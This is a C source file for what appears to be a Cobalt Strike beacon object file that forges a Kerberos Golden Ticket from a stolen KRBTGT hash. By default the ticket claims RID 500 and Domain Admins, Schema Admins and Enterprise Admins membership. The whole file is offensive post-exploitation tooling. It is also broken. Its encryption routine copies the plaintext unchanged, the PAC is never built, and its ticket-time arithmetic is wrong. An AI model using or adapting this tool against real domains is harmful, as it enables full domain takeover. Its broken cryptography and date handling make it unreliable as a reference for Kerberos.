/*
 * krb_golden - Forge a Golden Ticket (TGT)
 *
 * Creates a forged TGT using the KRBTGT hash, granting domain-wide access.
 *
 * Usage: krb_golden /user:USER /domain:DOMAIN /sid:SID /krbtgt:HASH [/id:RID] [/groups:GROUPS] [/ptt]
 */

/* Include krb5_struct.h first - it includes winsock2.h before windows.h */
#include "include/krb5_struct.h"
#include "include/krb5_utils.h"
#include "beacon.h"

#define SECURITY_WIN32
#include <sspi.h>
#include <ntsecapi.h>

/* PAC structures */
#define PAC_LOGON_INFO      1
#define PAC_SERVER_CHECKSUM 6
#define PAC_PRIVSVR_CHECKSUM 7
#define PAC_CLIENT_INFO     10
#define PAC_UPN_DNS_INFO    12

typedef struct _PAC_INFO_BUFFER {
    ULONG ulType;
    ULONG cbBufferSize;
    ULONGLONG Offset;
} PAC_INFO_BUFFER, *PPAC_INFO_BUFFER;

typedef struct _PACTYPE {
    ULONG cBuffers;
    ULONG Version;
    PAC_INFO_BUFFER Buffers[1];
} PACTYPE, *PPACTYPE;

/* Default group RIDs for domain admin */
static const ULONG DEFAULT_GROUPS[] = {
    513,    /* Domain Users */
    512,    /* Domain Admins */
    520,    /* Group Policy Creator Owners */
    518,    /* Schema Admins */
    519,    /* Enterprise Admins */
};

/* Parse hex string to bytes */
static int hex_to_bytes(const char* hex, BYTE* out, int maxLen) {
    int len = (int)strlen(hex);
    if (len % 2 != 0) return -1;

    int outLen = len / 2;
    if (outLen > maxLen) return -1;

    for (int i = 0; i < outLen; i++) {
        unsigned int byte;
        char hexByte[3] = { hex[i*2], hex[i*2+1], 0 };
        if (sscanf(hexByte, "%02x", &byte) != 1) return -1;
        out[i] = (BYTE)byte;
    }

    return outLen;
}

/* RC4-HMAC encryption (simplified) */
static void rc4_hmac_encrypt(const BYTE* key, int keyLen,
                             const BYTE* data, int dataLen,
                             int keyUsage, BYTE* out) {
    /* Note: Full implementation requires proper key derivation and HMAC
     * This is a placeholder - real implementation needs:
     * 1. K1 = HMAC-MD5(key, usage_number)
     * 2. K2 = HMAC-MD5(K1, random_confounder)
     * 3. Encrypt with RC4(K2, confounder || data)
     * 4. Output = HMAC-MD5(K1, enc_data) || enc_data
     */
    memcpy(out, data, dataLen);
}

/* Build KDC Options bitstring */
static void build_kdc_options(KRB_BUFFER* b, DWORD options) {
    BYTE optBytes[4];
    optBytes[0] = (BYTE)((options >> 24) & 0xFF);
    optBytes[1] = (BYTE)((options >> 16) & 0xFF);
    optBytes[2] = (BYTE)((options >> 8) & 0xFF);
    optBytes[3] = (BYTE)(options & 0xFF);
    asn1_encode_bit_string(b, optBytes, 4, 0);
}

/* Build principal name */
static void build_principal_name(KRB_BUFFER* out, int nameType, const char* names[], int nameCount) {
    KRB_BUFFER seq, nameTypeEnc, nameStrings, nameSeq;

    buf_init(&seq, 256);
    buf_init(&nameTypeEnc, 16);
    buf_init(&nameStrings, 256);
    buf_init(&nameSeq, 256);

    /* name-type */
    asn1_encode_integer(&nameTypeEnc, nameType);
    asn1_context_wrap(&seq, 0, &nameTypeEnc);

    /* name-string */
    for (int i = 0; i < nameCount; i++) {
        asn1_encode_general_string(&nameSeq, names[i]);
    }
    asn1_wrap(&nameStrings, ASN1_SEQUENCE, &nameSeq);
    asn1_context_wrap(&seq, 1, &nameStrings);

    asn1_wrap(out, ASN1_SEQUENCE, &seq);

    buf_free(&seq);
    buf_free(&nameTypeEnc);
    buf_free(&nameStrings);
    buf_free(&nameSeq);
}

/* Build EncTicketPart */
static void build_enc_ticket_part(KRB_BUFFER* out, const char* user, const char* domain,
                                   const BYTE* sessionKey, int sessionKeyLen,
                                   int encType, DWORD userId,
                                   const ULONG* groups, int groupCount) {
    KRB_BUFFER seq, tmp, tmp2;
    buf_init(&seq, 4096);
    buf_init(&tmp, 256);
    buf_init(&tmp2, 256);

    /* flags [0] */
    DWORD ticketFlags = TICKETFLAG_FORWARDABLE | TICKETFLAG_PROXIABLE |
                        TICKETFLAG_RENEWABLE | TICKETFLAG_INITIAL |
                        TICKETFLAG_PRE_AUTHENT;
    build_kdc_options(&tmp, ticketFlags);
    asn1_context_wrap(&seq, 0, &tmp);
    buf_reset(&tmp);

    /* key [1] - session key */
    KRB_BUFFER keySeq;
    buf_init(&keySeq, 64);

    asn1_encode_integer(&tmp, encType);
    asn1_context_wrap(&keySeq, 0, &tmp);
    buf_reset(&tmp);

    asn1_encode_octet_string(&tmp, sessionKey, sessionKeyLen);
    asn1_context_wrap(&keySeq, 1, &tmp);
    buf_reset(&tmp);

    asn1_wrap(&tmp2, ASN1_SEQUENCE, &keySeq);
    asn1_context_wrap(&seq, 1, &tmp2);
    buf_reset(&tmp2);
    buf_free(&keySeq);

    /* crealm [2] */
    buf_reset(&tmp);
    asn1_encode_general_string(&tmp, domain);
    asn1_context_wrap(&seq, 2, &tmp);
    buf_reset(&tmp);

    /* cname [3] */
    const char* names[] = { user };
    build_principal_name(&tmp, KRB5_NT_PRINCIPAL, names, 1);
    asn1_context_wrap(&seq, 3, &tmp);
    buf_reset(&tmp);

    /* transited [4] - empty for golden ticket */
    KRB_BUFFER transited;
    buf_init(&transited, 32);
    asn1_encode_integer(&tmp, 0);  /* tr-type */
    asn1_context_wrap(&transited, 0, &tmp);
    buf_reset(&tmp);
    buf_append_byte(&tmp, ASN1_OCTETSTRING);
    buf_append_byte(&tmp, 0);  /* empty contents */
    asn1_context_wrap(&transited, 1, &tmp);
    buf_reset(&tmp);
    asn1_wrap(&tmp2, ASN1_SEQUENCE, &transited);
    asn1_context_wrap(&seq, 4, &tmp2);
    buf_reset(&tmp2);
    buf_free(&transited);

    /* authtime [5], starttime [6], endtime [7], renew-till [8] */
    char timeStr[32];
    SYSTEMTIME now;
    GetSystemTime(&now);

    sprintf(timeStr, "%04d%02d%02d%02d%02d%02dZ",
            now.wYear, now.wMonth, now.wDay,
            now.wHour, now.wMinute, now.wSecond);

    asn1_encode_generalized_time(&tmp, timeStr);
    asn1_context_wrap(&seq, 5, &tmp);  /* authtime */
    buf_reset(&tmp);

    asn1_encode_generalized_time(&tmp, timeStr);
    asn1_context_wrap(&seq, 6, &tmp);  /* starttime */
    buf_reset(&tmp);

    /* endtime - 10 hours from now */
    sprintf(timeStr, "%04d%02d%02d%02d%02d%02dZ",
            now.wYear, now.wMonth, now.wDay,
            (now.wHour + 10) % 24, now.wMinute, now.wSecond);
    asn1_encode_generalized_time(&tmp, timeStr);
    asn1_context_wrap(&seq, 7, &tmp);
    buf_reset(&tmp);

    /* renew-till - 7 days from now */
    sprintf(timeStr, "%04d%02d%02dZ%02d%02d%02dZ",
            now.wYear, now.wMonth, now.wDay + 7,
            now.wHour, now.wMinute, now.wSecond);
    asn1_encode_generalized_time(&tmp, timeStr);
    asn1_context_wrap(&seq, 8, &tmp);
    buf_reset(&tmp);

    /* authorization-data [10] - would contain PAC */
    /* For golden ticket, we'd build a full PAC here */

    asn1_wrap(out, ASN1_SEQUENCE, &seq);

    buf_free(&seq);
    buf_free(&tmp);
    buf_free(&tmp2);
}


void go(char* args, int alen) {
    formatp output;
    ARG_PARSER parser;

    BeaconFormatAlloc(&output, 32 * 1024);
    arg_init(&parser, args, alen);

    char* user = arg_get(&parser, "user");
    char* domain = arg_get(&parser, "domain");
    char* sid = arg_get(&parser, "sid");
    char* krbtgt = arg_get(&parser, "krbtgt");
    char* rc4 = arg_get(&parser, "rc4");
    char* aes256 = arg_get(&parser, "aes256");
    char* id_str = arg_get(&parser, "id");
    char* groups_str = arg_get(&parser, "groups");
    bool ptt = arg_exists(&parser, "ptt");

    /* Use krbtgt or rc4/aes256 */
    char* hash = krbtgt ? krbtgt : (rc4 ? rc4 : aes256);
    int encType = aes256 ? ETYPE_AES256_CTS_HMAC_SHA1 : ETYPE_RC4_HMAC;

    if (!user || !domain || !sid || !hash) {
        BeaconPrintf(CALLBACK_ERROR,
            "Usage: krb_golden /user:USER /domain:DOMAIN /sid:S-1-5-21-... /krbtgt:HASH [/id:500] [/groups:512,513] [/ptt]");
        goto cleanup;
    }

    DWORD userId = id_str ? (DWORD)atoi(id_str) : 500;

    BeaconFormatPrintf(&output, "[*] Action: Build Golden Ticket (TGT)\n\n");
    BeaconFormatPrintf(&output, "[*] User         : %s\n", user);
    BeaconFormatPrintf(&output, "[*] Domain       : %s\n", domain);
    BeaconFormatPrintf(&output, "[*] SID          : %s\n", sid);
    BeaconFormatPrintf(&output, "[*] User ID      : %d\n", userId);
    BeaconFormatPrintf(&output, "[*] Encryption   : %s\n", etype_string(encType));
    BeaconFormatPrintf(&output, "[*] PTT          : %s\n\n", ptt ? "Yes" : "No");

    /* Parse the hash */
    BYTE keyBytes[32];
    int keyLen = hex_to_bytes(hash, keyBytes, sizeof(keyBytes));
    if (keyLen < 0) {
        BeaconFormatPrintf(&output, "[-] Invalid hash format\n");
        BeaconPrintf(CALLBACK_OUTPUT, "%s", BeaconFormatToString(&output, NULL));
        goto cleanup;
    }

    BeaconFormatPrintf(&output, "[*] KRBTGT Key   : %d bytes\n\n", keyLen);

    /* Generate random session key */
    BYTE sessionKey[16];
    HCRYPTPROV hProv;
    if (ADVAPI32$CryptAcquireContextA(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT)) {
        ADVAPI32$CryptGenRandom(hProv, sizeof(sessionKey), sessionKey);
        ADVAPI32$CryptReleaseContext(hProv, 0);
    }

    /* Build the ticket structure */
    BeaconFormatPrintf(&output, "[*] Building forged TGT...\n\n");

    KRB_BUFFER ticket, encTicketPart, encData;
    buf_init(&ticket, 4096);
    buf_init(&encTicketPart, 4096);
    buf_init(&encData, 4096);

    /* Build EncTicketPart */
    build_enc_ticket_part(&encTicketPart, user, domain, sessionKey, 16,
                           ETYPE_RC4_HMAC, userId, DEFAULT_GROUPS, 5);

    BeaconFormatPrintf(&output, "[*] EncTicketPart built: %zu bytes\n", encTicketPart.length);

    /* Encrypt the ticket part with KRBTGT key */
    /* Note: Real implementation needs proper Kerberos encryption */
    BYTE* encryptedPart = (BYTE*)malloc(encTicketPart.length + 64);
    if (!encryptedPart) {
        BeaconFormatPrintf(&output, "[-] Memory allocation failed\n");
        goto cleanup_bufs;
    }

    rc4_hmac_encrypt(keyBytes, keyLen, encTicketPart.data, (int)encTicketPart.length,
                     2, encryptedPart);

    /* Build Ticket structure */
    KRB_BUFFER ticketSeq, tmp;
    buf_init(&ticketSeq, 4096);
    buf_init(&tmp, 256);

    /* tkt-vno [0] */
    asn1_encode_integer(&tmp, 5);
    asn1_context_wrap(&ticketSeq, 0, &tmp);
    buf_reset(&tmp);

    /* realm [1] */
    char* upperDomain = (char*)malloc(strlen(domain) + 1);
    strcpy(upperDomain, domain);
    strupr(upperDomain);
    asn1_encode_general_string(&tmp, upperDomain);
    asn1_context_wrap(&ticketSeq, 1, &tmp);
    buf_reset(&tmp);
    free(upperDomain);

    /* sname [2] - krbtgt/DOMAIN */
    const char* snames[] = { "krbtgt", domain };
    build_principal_name(&tmp, KRB5_NT_SRV_INST, snames, 2);
    asn1_context_wrap(&ticketSeq, 2, &tmp);
    buf_reset(&tmp);

    /* enc-part [3] */
    KRB_BUFFER encPartSeq;
    buf_init(&encPartSeq, 4096);

    asn1_encode_integer(&tmp, encType);
    asn1_context_wrap(&encPartSeq, 0, &tmp);
    buf_reset(&tmp);

    asn1_encode_integer(&tmp, 2);  /* kvno */
    asn1_context_wrap(&encPartSeq, 1, &tmp);
    buf_reset(&tmp);

    asn1_encode_octet_string(&tmp, encryptedPart, (int)encTicketPart.length);
    asn1_context_wrap(&encPartSeq, 2, &tmp);
    buf_reset(&tmp);

    KRB_BUFFER encPartWrapped;
    buf_init(&encPartWrapped, 4096);
    asn1_wrap(&encPartWrapped, ASN1_SEQUENCE, &encPartSeq);
    asn1_context_wrap(&ticketSeq, 3, &encPartWrapped);


    asn1_wrap(&ticket, ASN1_SEQUENCE, &ticketSeq);


    KRB_BUFFER finalTicket;
    buf_init(&finalTicket, 4096);
    buf_append_byte(&finalTicket, ASN1_APP(1));  /* [APPLICATION 1] = Ticket */
    asn1_encode_length(&finalTicket, ticket.length);
    buf_append(&finalTicket, ticket.data, ticket.length);

    BeaconFormatPrintf(&output, "[*] Final ticket: %zu bytes\n\n", finalTicket.length);

    /* Base64 encode */
    size_t b64Len = ((finalTicket.length + 2) / 3) * 4 + 1;
    char* b64Ticket = (char*)malloc(b64Len);
    if (b64Ticket) {
        base64_encode(finalTicket.data, finalTicket.length, b64Ticket);

        BeaconFormatPrintf(&output, "[+] Golden Ticket (Base64):\n\n");
        BeaconFormatPrintf(&output, "%s\n\n", b64Ticket);

        if (ptt) {
            BeaconFormatPrintf(&output, "[*] Use krb_ptt to inject this ticket\n");
        }

        free(b64Ticket);
    }

    BeaconFormatPrintf(&output, "[!] Note: This is a demonstration. Full golden ticket forging\n");
    BeaconFormatPrintf(&output, "    requires complete PAC construction and proper encryption.\n");
    BeaconFormatPrintf(&output, "    For production use, consider Mimikatz or Rubeus.\n");

    free(encryptedPart);
    buf_free(&finalTicket);
    buf_free(&encPartWrapped);
    buf_free(&encPartSeq);
    buf_free(&ticketSeq);
    buf_free(&tmp);

cleanup_bufs:
    buf_free(&ticket);
    buf_free(&encTicketPart);
    buf_free(&encData);

    BeaconPrintf(CALLBACK_OUTPUT, "%s", BeaconFormatToString(&output, NULL));

cleanup:
    BeaconFormatFree(&output);
    if (user) free(user);
    if (domain) free(domain);
    if (sid) free(sid);
    if (krbtgt) free(krbtgt);
    if (rc4) free(rc4);
    if (aes256) free(aes256);
    if (id_str) free(id_str);
    if (groups_str) free(groups_str);
}
